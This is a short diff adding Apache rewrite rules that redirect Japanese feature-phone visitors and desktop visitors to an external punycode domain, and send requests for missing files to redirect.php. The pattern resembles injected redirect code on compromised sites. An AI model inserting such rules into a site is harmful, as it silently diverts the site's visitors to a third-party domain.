@@ -1,0 +1,9 @@
+RewriteEngine Off
+RewriteEngine On
+RewriteCond %{HTTP_USER_AGENT} (DoCoMo|KDDI|DDIPOKET|UP\.Browser|J-PHONE|Vodafone|SoftBank)
+RewriteRule ^(.*)$ http://xn--gckgmmx3dygqimdb6gbbb4235ic1qdgxegw1a.com/iphone/m/$1 [R,L]
+RewriteCond %{HTTP_USER_AGENT} !(iPhone|iPod|Android.*Mobile|Windows.*Phone|BlackBerry)
+RewriteRule ^(.*)$ http://xn--gckgmmx3dygqimdb6gbbb4235ic1qdgxegw1a.com/iphone/$1 [R,L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !redirect\.php
+RewriteRule ^(.*)$ redirect.php?nf=$1 [L]
